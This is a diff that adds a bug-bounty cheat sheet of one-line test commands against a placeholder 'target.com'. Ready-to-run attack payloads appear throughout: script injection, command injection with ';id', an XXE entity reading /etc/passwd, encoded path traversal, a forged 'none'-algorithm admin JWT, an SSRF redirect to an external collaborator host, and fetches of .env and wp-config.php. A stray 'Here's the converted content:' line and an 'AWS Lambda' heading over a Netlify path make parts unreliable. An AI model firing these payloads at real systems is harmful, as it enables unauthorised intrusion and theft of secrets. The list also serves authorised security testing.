@@ -2964,4 +2964,130 @@ Check for Debug Endpoints
 ```bash
 curl -s https://target.com/debug/vars
 ```
+Here’s the converted content:
+
+**Server Header Disclosure**  
+```bash
+curl -I https://target.com | grep Server
+```
+
+**Find Exposed GitHub Actions Secrets**  
+```bash
+gh api repos/target/repo/actions/secrets
+```
+
+**Test Blind XSS via User-Agent**  
+```bash
+curl -A "<script>alert(document.domain)</script>" https://target.com/
+```
+
+**Test for PHP Info Disclosure**  
+```bash
+curl -s https://target.com/phpinfo.php
+```
+
+**Exposed Kubernetes Dashboard via Proxy**  
+```bash
+curl -k https://target.com/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/
+```
+
+**GraphQL Schema Discovery**  
+```bash
+curl -X POST https://target.com/graphql -d '{"query":"{__schema{types{name}}}"}'
+```
+
+**Check for Exposed AWS Lambda Function**  
+```bash
+curl -s https://target.com/.netlify/functions/
+```
+
+**Sensitive Parameter Fuzzing**  
+```bash
+ffuf -u https://target.com/?FUZZ=test -w params.txt
+```
+
+**Detect Misconfigured CORS**  
+```bash
+curl -I -H "Origin: https://evil.com" https://target.com
+```
+
+**Check for Weak JWT Tokens (None Algorithm)**  
+```bash
+curl -s https://target.com/api -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
+```
+
+**Exposed .env Files (Sensitive Config)**  
+```bash
+curl -s https://target.com/.env
+```
+
+**Sensitive GitHub Issues (Bug Bounty Targets)**  
+```bash
+gh issue list --repo target/repo --search "security"
+```
+
+**Exposed Internal IP Disclosure via Headers**  
+```bash
+curl -I https://target.com | grep -i 'x-originating-ip\|x-forwarded-for'
+```
+
+**Reverse Proxy Bypass Tricks**  
+```bash
+curl -I https://target.com/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd
+```
+
+**Check for SSRF via Open Redirects**  
+```bash
+curl "https://target.com/redirect?url=http://burpcollaborator.net"
+```
+
+**Check for Command Injection in Parameters**  
+```bash
+curl "https://target.com/ping?host=127.0.0.1;id"
+```
+
+**Test for XML External Entity (XXE)**  
+```bash
+curl -X POST https://target.com/upload -d '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>'
+```
+
+**Test for Server-Side Template Injection (SSTI)**  
+```bash
+curl "https://target.com/render?template={{7*7}}"
+```
+
+**Sensitive File Leak Check (.DS_Store, .bak)**  
+```bash
+curl -I https://target.com/.DS_Store
+```
+
+**DNS Takeover Discovery**  
+```bash
+host -t cname sub.target.com
+```
+
+**Test for Misconfigured CORS (Wildcard Origin)**  
+```bash
+curl -I -H "Origin: https://evil.com" https://target.com
+```
+
+**Directory Traversal with Double Encoding**  
+```bash
+curl "https://target.com/download?file=%252E%252E%252F%252E%252E%252Fetc%252Fpasswd"
+```
+
+**Check for Exposed Configuration Files**  
+```bash
+curl -s https://target.com/wp-config.php
+```
+
+**Find Environment Variables in Responses**  
+```bash
+curl -s https://target.com | grep -E 'AWS_ACCESS_KEY|DB_PASSWORD'
+```
+
+**Check for Misconfigured Security Headers**  
+```bash
+curl -I https://target.com | grep -i "X-Frame-Options\|Content-Security-Policy\|Strict-Transport-Security"
+```
 
